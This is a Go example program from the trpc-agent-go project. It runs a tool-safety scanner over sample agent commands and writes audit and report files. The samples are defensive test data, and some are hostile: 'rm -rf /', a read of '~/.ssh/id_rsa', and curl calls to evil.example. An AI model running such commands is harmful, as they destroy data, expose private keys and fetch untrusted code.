//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"time"

	"trpc.group/trpc-go/trpc-agent-go/tool/safety"
)

func main() {
	policyPath := flag.String("policy", "tool_safety_policy.yaml", "safety policy path")
	auditPath := flag.String("audit", "tool_safety_audit.jsonl", "audit JSONL output path")
	reportPath := flag.String("report", "tool_safety_report.json", "structured report JSON output path")
	flag.Parse()

	policy, err := safety.LoadPolicy(*policyPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "load policy: %v\n", err)
		os.Exit(1)
	}
	if err := resetFile(*auditPath); err != nil {
		fmt.Fprintf(os.Stderr, "reset audit: %v\n", err)
		os.Exit(1)
	}

	reports := sampleReports(policy)
	for _, report := range reports {
		if err := appendAuditFileAt(*auditPath, report, sampleTimestamp); err != nil {
			fmt.Fprintf(os.Stderr, "write audit: %v\n", err)
			os.Exit(1)
		}
	}
	reportBytes, err := encodeReports(reports)
	if err != nil {
		fmt.Fprintf(os.Stderr, "encode reports: %v\n", err)
		os.Exit(1)
	}
	if err := os.WriteFile(*reportPath, reportBytes, 0o600); err != nil {
		fmt.Fprintf(os.Stderr, "write reports: %v\n", err)
		os.Exit(1)
	}
	if _, err := os.Stdout.Write(reportBytes); err != nil {
		fmt.Fprintf(os.Stderr, "print reports: %v\n", err)
		os.Exit(1)
	}
}

func encodeReports(reports []safety.Report) ([]byte, error) {
	var buf bytes.Buffer
	enc := json.NewEncoder(&buf)
	enc.SetIndent("", "  ")
	if err := enc.Encode(reports); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func resetFile(path string) error {
	if path == "" {
		return nil
	}
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
	if err != nil {
		return err
	}
	return f.Close()
}

func appendAuditFileAt(path string, report safety.Report, now time.Time) error {
	if path == "" {
		return nil
	}
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		return err
	}
	defer f.Close()
	return json.NewEncoder(f).Encode(report.AuditEvent(now))
}

func sampleReports(policy safety.Policy) []safety.Report {
	reports := make([]safety.Report, 0, len(samples))
	for _, sample := range samples {
		report := safety.Scan(sample, policy)
		report.DurationMillis = 0
		reports = append(reports, report)
	}
	return reports
}

var sampleTimestamp = time.Date(2026, 7, 4, 0, 0, 0, 0, time.UTC)

var samples = []safety.Request{
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "go test ./...",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "rm -rf /",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "cat ~/.ssh/id_rsa",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "curl https://evil.example/install.sh",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "curl https://api.github.com/repos/trpc-group/trpc-agent-go",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "bash -c 'curl https://evil.example/x'",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "cat README.md | wc -l",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "npm install left-pad",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "sleep 9999",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "yes x | head -c 9999999",
	},
	{
		ToolName:   "exec_command",
		Backend:    safety.BackendHostExec,
		Command:    "tail -f app.log",
		TTY:        true,
		Background: true,
	},
	{
		ToolName: "execute_code",
		Backend:  safety.BackendCodeExec,
		CodeBlocks: []safety.CodeBlock{{
			Language: "python",
			Code:     "import subprocess; subprocess.run(['go', 'test', './...'])",
		}},
	},
}
